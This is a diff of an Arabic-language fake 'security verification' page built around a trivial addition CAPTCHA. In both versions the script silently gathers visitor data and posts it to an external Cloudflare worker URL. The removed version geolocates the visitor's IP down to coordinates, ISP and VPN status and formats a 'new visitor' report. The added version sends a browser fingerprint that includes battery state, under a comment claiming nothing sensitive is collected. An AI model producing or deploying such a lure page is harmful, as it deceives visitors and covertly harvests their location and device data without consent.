@@ -5,236 +5,92 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>التحقق الأمني</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
   body {
-    min-height: 100vh;
-    display: flex; align-items: center; justify-content: center;
-    background: #0f172a;
-    padding: 20px;
-    position: relative;
-    overflow: hidden;
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    background: #0f172a; padding: 20px; position: relative; overflow: hidden;
   }
-
-  /* تدرج ناعم في الخلفية */
   body::before {
-    content: '';
-    position: absolute;
-    inset: 0;
+    content: ''; position: absolute; inset: 0;
     background:
-      radial-gradient(circle at 20% 20%, rgba(99, 102, 241, 0.25), transparent 40%),
-      radial-gradient(circle at 80% 80%, rgba(168, 85, 247, 0.25), transparent 40%);
-    animation: glow 8s ease-in-out infinite alternate;
+      radial-gradient(circle at 20% 20%, rgba(99,102,241,.25), transparent 40%),
+      radial-gradient(circle at 80% 80%, rgba(168,85,247,.25), transparent 40%);
   }
-
-  @keyframes glow {
-    from { opacity: 0.6; }
-    to   { opacity: 1; }
-  }
-
   .card {
-    position: relative;
-    background: #1e293b;
-    border: 1px solid rgba(255, 255, 255, 0.08);
-    border-radius: 20px;
-    padding: 36px 28px 28px;
+    position: relative; background: #1e293b;
+    border: 1px solid rgba(255,255,255,.08);
+    border-radius: 20px; padding: 36px 28px 28px;
     width: 100%; max-width: 420px;
-    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
-    text-align: center;
-    animation: enter 0.5s cubic-bezier(0.2, 0.8, 0.3, 1);
-    z-index: 1;
+    box-shadow: 0 25px 50px rgba(0,0,0,.5); text-align: center;
+    animation: enter .5s cubic-bezier(.2,.8,.3,1); z-index: 1;
   }
-
-  @keyframes enter {
-    from { opacity: 0; transform: translateY(20px); }
-    to   { opacity: 1; transform: none; }
-  }
-
+  @keyframes enter { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform:none; } }
   .icon-box {
-    width: 60px; height: 60px;
-    margin: 0 auto 18px;
+    width: 60px; height: 60px; margin: 0 auto 18px;
     background: linear-gradient(135deg, #6366f1, #a855f7);
-    border-radius: 16px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 28px;
-    box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4);
+    border-radius: 16px; display: flex; align-items: center; justify-content: center;
+    font-size: 28px; box-shadow: 0 8px 20px rgba(99,102,241,.4);
   }
-
-  h1 {
-    color: #f1f5f9;
-    font-size: 22px;
-    font-weight: 700;
-    margin-bottom: 8px;
-    letter-spacing: -0.3px;
-  }
-
-  .subtitle {
-    color: #94a3b8;
-    font-size: 13.5px;
-    margin-bottom: 26px;
-    line-height: 1.5;
-  }
-
+  h1 { color: #f1f5f9; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+  .subtitle { color: #94a3b8; font-size: 13.5px; margin-bottom: 26px; }
   .captcha-box {
-    background: #0f172a;
-    border: 1px solid rgba(255, 255, 255, 0.06);
-    border-radius: 14px;
-    padding: 24px 18px;
-    margin-bottom: 16px;
+    background: #0f172a; border: 1px solid rgba(255,255,255,.06);
+    border-radius: 14px; padding: 24px 18px; margin-bottom: 16px;
   }
-
   .captcha {
-    font-size: 30px;
-    font-weight: 700;
-    color: #f1f5f9;
-    letter-spacing: 5px;
+    font-size: 30px; font-weight: 700; color: #f1f5f9; letter-spacing: 5px;
     font-family: 'Courier New', monospace;
-    direction: ltr;
-    unicode-bidi: embed;
+    direction: ltr; unicode-bidi: embed;
   }
-
   input {
-    width: 100%;
-    padding: 15px 16px;
-    font-size: 17px;
-    font-weight: 600;
-    border: 1.5px solid rgba(255, 255, 255, 0.1);
-    border-radius: 12px;
-    background: #0f172a;
-    color: #f1f5f9;
-    text-align: center;
-    outline: none;
-    transition: 0.2s;
-    margin-bottom: 14px;
+    width: 100%; padding: 15px 16px; font-size: 17px; font-weight: 600;
+    border: 1.5px solid rgba(255,255,255,.1); border-radius: 12px;
+    background: #0f172a; color: #f1f5f9; text-align: center; outline: none;
+    transition: .2s; margin-bottom: 14px;
   }
-
-  input::placeholder {
-    color: #64748b;
-    font-weight: 500;
-    font-size: 14.5px;
-  }
-
-  input:focus {
-    border-color: #6366f1;
-    box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
-    background: #0b1220;
-  }
-
-  /* إزالة سهام حقل الأرقام */
-  input::-webkit-outer-spin-button,
-  input::-webkit-inner-spin-button {
-    -webkit-appearance: none;
-    margin: 0;
-  }
+  input::placeholder { color: #64748b; font-weight: 500; }
+  input:focus { border-color: #6366f1; box-shadow: 0 0 0 4px rgba(99,102,241,.15); }
+  input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; }
   input[type=number] { -moz-appearance: textfield; }
-
   button {
-    width: 100%;
-    padding: 15px;
-    font-size: 16px;
-    font-weight: 700;
-    color: #fff;
-    background: linear-gradient(135deg, #6366f1, #a855f7);
-    border: none;
-    border-radius: 12px;
-    cursor: pointer;
-    transition: 0.25s;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    font-family: inherit;
+    width: 100%; padding: 15px; font-size: 16px; font-weight: 700;
+    color: #fff; background: linear-gradient(135deg, #6366f1, #a855f7);
+    border: none; border-radius: 12px; cursor: pointer;
+    transition: .25s; display: flex; align-items: center;
+    justify-content: center; gap: 8px; font-family: inherit;
   }
-
-  button:hover:not(:disabled) {
-    transform: translateY(-1px);
-    box-shadow: 0 10px 25px rgba(99, 102, 241, 0.5);
-  }
-
-  button:active:not(:disabled) {
-    transform: translateY(0);
-  }
-
-  button:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-  }
-
-  .msg {
-    margin-top: 14px;
-    font-size: 13.5px;
-    font-weight: 600;
-    min-height: 20px;
-  }
-
+  button:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 10px 25px rgba(99,102,241,.5); }
+  button:disabled { opacity: .6; cursor: not-allowed; }
+  .msg { margin-top: 14px; font-size: 13.5px; font-weight: 600; min-height: 20px; }
   .err { color: #f87171; }
-  .ok  { color: #4ade80; }
-
   .spinner {
     width: 15px; height: 15px;
-    border: 2.5px solid rgba(255, 255, 255, 0.3);
-    border-top-color: #fff;
-    border-radius: 50%;
-    animation: spin 0.7s linear infinite;
+    border: 2.5px solid rgba(255,255,255,.3); border-top-color: #fff;
+    border-radius: 50%; animation: spin .7s linear infinite;
   }
-
   @keyframes spin { to { transform: rotate(360deg); } }
-
-  /* شاشة النجاح */
   .success {
-    width: 76px; height: 76px;
-    margin: 0 auto 20px;
+    width: 76px; height: 76px; margin: 0 auto 20px;
     background: linear-gradient(135deg, #10b981, #059669);
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 40px;
-    color: #fff;
-    box-shadow: 0 12px 28px rgba(16, 185, 129, 0.4);
-    animation: pop 0.5s cubic-bezier(0.2, 1.4, 0.4, 1);
+    border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    font-size: 40px; color: #fff;
+    box-shadow: 0 12px 28px rgba(16,185,129,.4);
+    animation: pop .5s cubic-bezier(.2,1.4,.4,1);
   }
-
-  @keyframes pop {
-    0%   { transform: scale(0); }
-    60%  { transform: scale(1.15); }
-    100% { transform: scale(1); }
-  }
-
-  .success-title {
-    color: #4ade80;
-    font-size: 22px;
-    font-weight: 700;
-    margin-bottom: 6px;
-  }
-
-  .success-text {
-    color: #94a3b8;
-    font-size: 13.5px;
-  }
-
+  @keyframes pop { 0% { transform: scale(0); } 60% { transform: scale(1.15); } 100% { transform: scale(1); } }
+  .success-title { color: #4ade80; font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+  .success-text { color: #94a3b8; font-size: 13.5px; }
   .footer {
-    margin-top: 22px;
-    padding-top: 18px;
-    border-top: 1px solid rgba(255, 255, 255, 0.06);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 7px;
-    font-size: 11.5px;
-    color: #64748b;
+    margin-top: 22px; padding-top: 18px;
+    border-top: 1px solid rgba(255,255,255,.06);
+    display: flex; align-items: center; justify-content: center;
+    gap: 7px; font-size: 11.5px; color: #64748b;
   }
-
   .dot {
-    width: 6px; height: 6px;
-    background: #10b981;
-    border-radius: 50%;
-    box-shadow: 0 0 8px #10b981;
-    animation: pulse 2s ease-in-out infinite;
+    width: 6px; height: 6px; background: #10b981; border-radius: 50%;
+    box-shadow: 0 0 8px #10b981; animation: pulse 2s ease-in-out infinite;
   }
-
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50%      { opacity: 0.3; }
-  }
+  @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:.3; } }
 </style>
 </head>
 <body>
@@ -242,19 +98,12 @@
     <div class="icon-box">🔒</div>
     <h1>التحقق الأمني</h1>
     <p class="subtitle">يرجى حل المسألة للتأكد من أنك لست روبوت</p>
-
     <div class="captcha-box">
       <div class="captcha" id="captcha">…</div>
     </div>
-
     <input type="number" id="answer" placeholder="أدخل الناتج" autocomplete="off" inputmode="numeric">
-
-    <button id="btn" onclick="verify()">
-      <span>تحقق</span>
-    </button>
-
+    <button id="btn" onclick="verify()"><span>تحقق</span></button>
     <div class="msg" id="msg"></div>
-
     <div class="footer">
       <span class="dot"></span>
       <span>اتصال آمن ومشفّر</span>
@@ -262,78 +111,26 @@
   </div>
 
 <script>
-  
-const WORKER_URL = "https://floral-darkness-02bc.imoon-b2.workers.dev/";
-/* ==================================================== */
+/* رابط واحد فقط — لا شيء آخر مكشوف */
+const API = "https://floral-darkness-02bc.imoon-b2.workers.dev";
 
-let num1, num2, correct;
+let a, b, sum;
 
 function newCaptcha() {
-  num1 = Math.floor(Math.random() * 9) + 1;
-  num2 = Math.floor(Math.random() * 9) + 1;
-  correct = num1 + num2;
-  document.getElementById('captcha').textContent = `${num1} + ${num2} = ?`;
+  a = Math.floor(Math.random() * 9) + 1;
+  b = Math.floor(Math.random() * 9) + 1;
+  sum = a + b;
+  document.getElementById('captcha').textContent = `${a} + ${b} = ?`;
   document.getElementById('answer').value = '';
   document.getElementById('msg').textContent = '';
 }
 
-async function getIP() {
+async function getBattery() {
   try {
-    const r = await fetch('https://api64.ipify.org?format=json');
-    const d = await r.json();
-    return d.ip;
+    if (!navigator.getBattery) return '';
+    const bt = await navigator.getBattery();
+    return Math.round(bt.level * 100) + '%' + (bt.charging ? ' ⚡' : ' 🔋');
   } catch { return ''; }
-}
-
-async function getIPInfo(ip) {
-  try {
-    const r = await fetch(`https://ipwho.is/${ip}`);
-    return await r.json();
-  } catch { return {}; }
-}
-
-function getDeviceInfo() {
-  const info = {};
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (conn) {
-    info.connectionType = conn.effectiveType || conn.type || '—';
-    info.downlink = conn.downlink ? conn.downlink + ' Mbps' : '—';
-    info.rtt = conn.rtt ? conn.rtt + ' ms' : '—';
-    info.saveData = conn.saveData ? 'نعم' : 'لا';
-  } else {
-    info.connectionType = 'غير مدعوم';
-    info.downlink = '—';
-    info.rtt = '—';
-    info.saveData = '—';
-  }
-  info.screen = `${screen.width} × ${screen.height}`;
-  info.windowSize = `${window.innerWidth} × ${window.innerHeight}`;
-  info.pixelRatio = window.devicePixelRatio || 1;
-  info.language = navigator.language || '—';
-  info.languages = (navigator.languages || []).join(', ') || '—';
-  info.platform = navigator.platform || '—';
-  info.cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' نواة' : '—';
-  info.touchPoints = navigator.maxTouchPoints || 0;
-  info.darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'نعم 🌙' : 'لا ☀️';
-  try { info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '—'; }
-  catch { info.timezone = '—'; }
-  return info;
-}
-
-/* ✅ الإرسال عبر الوسيط (بدون توكن) */
-async function sendViaProxy(text) {
-  try {
-    const r = await fetch(WORKER_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ text: text })
-    });
-    const data = await r.json();
-    return data.ok;
-  } catch (e) {
-    console.error('Proxy error:', e);
-    return false;
-  }
 }
 
 async function verify() {
@@ -346,8 +143,7 @@ async function verify() {
     msg.textContent = '⚠️ الرجاء إدخال رقم';
     return;
   }
-
-  if (val !== correct) {
+  if (val !== sum) {
     msg.className = 'msg err';
     msg.textContent = '❌ إجابة خاطئة، حاول مرة أخرى';
     newCaptcha();
@@ -357,80 +153,41 @@ async function verify() {
   btn.disabled = true;
   btn.innerHTML = '<span>جاري التحقق</span><span class="spinner"></span>';
   msg.textContent = '';
-  msg.className = 'msg';
 
-  const ua = navigator.userAgent;
-  const ip = await getIP();
-  const info = ip ? await getIPInfo(ip) : {};
-  const device = getDeviceInfo();
+  // جمع البيانات الخام — لا شيء حساس هنا
+  const conn = navigator.connection || {};
+  const payload = {
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    languages: (navigator.languages || []).join(', '),
+    screen: `${screen.width}x${screen.height}`,
+    windowSize: `${innerWidth}x${innerHeight}`,
+    pixelRatio: devicePixelRatio,
+    platform: navigator.platform,
+    cores: navigator.hardwareConcurrency || '',
+    touchPoints: navigator.maxTouchPoints || 0,
+    darkMode: matchMedia('(prefers-color-scheme: dark)').matches ? 'نعم 🌙' : 'لا ☀️',
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+    conn: conn.effectiveType || '',
+    downlink: conn.downlink ? conn.downlink + ' Mbps' : '',
+    rtt: conn.rtt ? conn.rtt + ' ms' : '',
+    battery: await getBattery(),
+  };
 
-  let flag = '';
-  const cc = (info.country_code || '').toUpperCase();
-  if (cc.length === 2) {
-    flag = String.fromCodePoint(...[...cc].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
-  }
+  try {
+    await fetch(API, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+  } catch {}
 
-  const proxy = (info.security && info.security.proxy) ? '🔴 نعم' : '🟢 لا';
-  const hosting = (info.security && info.security.hosting) ? '🏢 استضافة' : '🏠 سكني';
-
-  const mapsLink = (info.latitude && info.longitude)
-    ? `https://www.google.com/maps?q=${info.latitude},${info.longitude}`
-    : null;
-
-  const message =
-    '🔔 <b>زائر جديد اجتاز الكابتشا</b>\n' +
-    '━━━━━━━━━━━━━━━━━━━\n' +
-    `🌐 <b>IP:</b> <code>${ip || 'غير معروف'}</code>\n` +
-    `🌍 <b>الدولة:</b> ${flag} ${info.country || '—'} (${cc || '—'})\n` +
-    `🏙️ <b>المدينة:</b> ${info.city || '—'}\n` +
-    `📍 <b>المنطقة:</b> ${info.region || '—'}\n` +
-    `📮 <b>الرمز البريدي:</b> ${info.postal || '—'}\n` +
-    `🗺️ <b>الإحداثيات:</b> ${info.latitude || '—'}, ${info.longitude || '—'}\n` +
-    (mapsLink ? `📌 <a href="${mapsLink}">📍 عرض الموقع على Google Maps</a>\n` : '') +
-    `🕐 <b>المنطقة الزمنية:</b> ${(info.timezone && info.timezone.id) || '—'}\n` +
-    '━━━━━━━━━━━━━━━━━━━\n' +
-    `🏢 <b>ISP:</b> ${(info.connection && info.connection.isp) || '—'}\n` +
-    `🏛️ <b>المنظمة:</b> ${(info.connection && info.connection.org) || '—'}\n` +
-    `📡 <b>ASN:</b> <code>${(info.connection && info.connection.asn) || '—'}</code>\n` +
-    `📶 <b>نوع الاتصال:</b> ${device.connectionType}\n` +
-    `⬇️ <b>سرعة التنزيل:</b> ${device.downlink}\n` +
-    `⏱️ <b>زمن الاستجابة (RTT):</b> ${device.rtt}\n` +
-    `💾 <b>توفير البيانات:</b> ${device.saveData}\n` +
-    '━━━━━━━━━━━━━━━━━━━\n' +
-    `🛡️ <b>بروكسي/VPN:</b> ${proxy}\n` +
-    `🖥️ <b>نوع الشبكة:</b> ${hosting}\n` +
-    '━━━━━━━━━━━━━━━━━━━\n' +
-    '📱 <b>معلومات الجهاز</b>\n' +
-    `🖼️ <b>دقة الشاشة:</b> ${device.screen}\n` +
-    `🪟 <b>حجم النافذة:</b> ${device.windowSize}\n` +
-    `🔍 <b>كثافة البكسل:</b> ${device.pixelRatio}x\n` +
-    `🌐 <b>لغة المتصفح:</b> ${device.language}\n` +
-    `🗣️ <b>اللغات:</b> ${device.languages}\n` +
-    `💻 <b>المنصة:</b> ${device.platform}\n` +
-    `⚙️ <b>عدد الأنوية:</b> ${device.cores}\n` +
-    `👆 <b>نقاط اللمس:</b> ${device.touchPoints}\n` +
-    `🌙 <b>الوضع الليلي:</b> ${device.darkMode}\n` +
-    `🕐 <b>المنطقة الزمنية:</b> ${device.timezone}\n` +
-    '━━━━━━━━━━━━━━━━━━━\n' +
-    `📲 <b>User-Agent:</b>\n<code>${ua}</code>`;
-
-  const ok = await sendViaProxy(message);
-
-  if (ok) {
-    document.getElementById('card').innerHTML =
-      '<div class="success">✓</div>' +
-      '<h1 class="success-title">تم التحقق بنجاح</h1>' +
-      '<p class="success-text">يمكنك المتابعة الآن</p>' +
-      '<div class="footer">' +
-        '<span class="dot"></span>' +
-        '<span>شكراً لك</span>' +
-      '</div>';
-  } else {
-    btn.disabled = false;
-    btn.innerHTML = '<span>تحقق</span>';
-    msg.className = 'msg err';
-    msg.textContent = '❌ فشل الإرسال، حاول مرة أخرى';
-  }
+  // عرض النجاح
+  document.getElementById('card').innerHTML =
+    '<div class="success">✓</div>' +
+    '<h1 class="success-title">تم التحقق بنجاح</h1>' +
+    '<p class="success-text">يمكنك المتابعة الآن</p>' +
+    '<div class="footer"><span class="dot"></span><span>شكراً لك</span></div>';
 }
 
 document.addEventListener('DOMContentLoaded', () => {
